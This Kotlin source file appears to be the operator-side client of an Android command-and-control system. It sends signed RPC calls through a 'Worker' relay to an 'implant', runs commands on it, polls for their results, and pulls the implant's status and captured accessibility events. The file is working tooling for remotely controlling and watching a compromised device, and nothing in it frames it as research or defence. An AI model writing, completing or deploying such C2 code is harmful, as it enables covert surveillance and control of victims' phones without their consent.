package com.shadow.operator.data

import android.util.Log
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.URL
import javax.net.ssl.HttpsURLConnection

data class RpcResponse(
    val cmdId: String?,
    val sent: Boolean?,
    val result: Any?,
    val results: List<Any>?,
    val status: Any?,
    val events: List<Any>?,
    val success: Boolean?
)

/**
 * HTTP RPC client — sends signed commands to the Worker, polls for results.
 * No WebSocket. Every call is a fresh HTTPS POST.
 */
class RpcClient(private val config: ClientConfig) {
    private val gson = Gson()

    companion object {
        const val TAG = "RpcClient"
        const val TIMEOUT_MS = 15000
    }

    private fun baseUrl(): String {
        return config.workerUrl
            .replace("wss://", "https://")
            .replace("/t/wss/", "/")
            .trimEnd('/')
    }

    /**
     * Send an RPC to the Worker (auto-signs with Ed25519).
     */
    suspend fun rpc(command: String, payload: String = "{}"): RpcResponse? = withContext(Dispatchers.IO) {
        try {
            val body = buildString {
                append("{")
                append("\"implantId\":\"${config.implantId}\",")
                append("\"command\":\"$command\",")
                append("\"payload\":$payload")
                append("}")
            }

            val timestamp = (System.currentTimeMillis() / 1000).toString()
            val signature = Ed25519Signer.signRpc(config.operatorPrivKey, timestamp, body)
                ?: return@withContext null

            val url = URL("${baseUrl()}/api/rpc")
            val conn = url.openConnection() as HttpsURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = TIMEOUT_MS
            conn.readTimeout = TIMEOUT_MS
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Signature", signature)
            conn.setRequestProperty("X-Timestamp", timestamp)

            conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }

            val code = conn.responseCode
            val response = if (code in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
            }
            Log.d(TAG, "RPC $command -> $code: ${response.take(500)}")
            gson.fromJson(response, RpcResponse::class.java)
        } catch (e: Exception) {
            Log.e(TAG, "RPC failed: ${e.message}")
            null
        }
    }

    /**
     * Execute a command on the implant and wait for the result (polls with timeout).
     */
    suspend fun execute(implantCommand: String, payload: String, timeoutMs: Long = 10000): String? = withContext(Dispatchers.IO) {
        val send = rpc("send_command", """{"command":"$implantCommand","payload":$payload}""")
            ?: return@withContext "ERROR: RPC request failed"
        val cmdId = send.cmdId ?: return@withContext "ERROR: no cmdId returned"

        if (send.sent != true) {
            return@withContext "ERROR: implant not connected (command queued)"
        }

        // Poll for result
        val start = System.currentTimeMillis()
        while (System.currentTimeMillis() - start < timeoutMs) {
            Thread.sleep(500)
            val result = rpc("get_result", """{"cmdId":"$cmdId"}""")
            val r = result?.result
            if (r != null) {
                @Suppress("UNCHECKED_CAST")
                val resultMap = r as? Map<String, Any>
                val status = resultMap?.get("status") as? String
                if (status == "completed") {
                    return@withContext (resultMap["data"] as? String) ?: "OK"
                }
            }
        }
        return@withContext "TIMEOUT: no response from implant in ${timeoutMs}ms"
    }

    /**
     * Get implant connection status.
     */
    suspend fun getStatus(): Map<String, Any>? = withContext(Dispatchers.IO) {
        val resp = rpc("get_status")
        @Suppress("UNCHECKED_CAST")
        resp?.status as? Map<String, Any>
    }

    /**
     * Get recent a11y events.
     */
    suspend fun getEvents(): List<Map<String, Any>>? = withContext(Dispatchers.IO) {
        val resp = rpc("get_events")
        @Suppress("UNCHECKED_CAST")
        resp?.events as? List<Map<String, Any>>
    }
}
